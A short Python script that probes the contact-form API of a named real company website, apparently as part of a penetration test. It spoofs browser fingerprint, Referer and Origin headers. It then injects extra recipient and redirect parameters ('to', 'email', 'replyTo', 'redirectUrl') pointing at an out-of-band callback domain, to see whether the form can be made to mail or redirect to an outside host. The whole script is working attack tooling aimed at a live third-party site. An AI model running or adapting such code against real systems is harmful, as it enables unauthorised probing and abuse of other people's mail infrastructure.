import sys,time
from curl_cffi import requests as cr
B="https://www.infinitycapital.bh"
OOB="relay7f3a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
S=cr.Session(impersonate="chrome124")
S.headers.update({"Referer":B+"/contact","Origin":B,"Accept":"*/*"})
def post(**kw):
    f={"fname":"vapt","lname":"probe","areacode":"+973","tel":"3600000",
       "cname":"vapt","subject":"s","msg":"m","check":"1","targets":"0"}
    f.update(kw)
    try:
        r=S.post(B+"/api/send",data=f,timeout=35,allow_redirects=False)
        return r.status_code, r.content[:400]
    except Exception as e:
        return "EXC", repr(e)[:200]
if __name__=="__main__":
    t=sys.argv[1]
    if t=="to":
        print("to=",post(to="probe@"+OOB))
    if t=="to2":
        print("to_json=",post(to='["probe@%s"]'%OOB))
    if t=="email":
        print("email=",post(email="probe@"+OOB))
    if t=="replyto":
        print("replyTo=",post(replyTo="probe@"+OOB))
    if t=="redirect":
        print("redirectUrl=",post(redirectUrl="http://"+OOB+"/redir"))
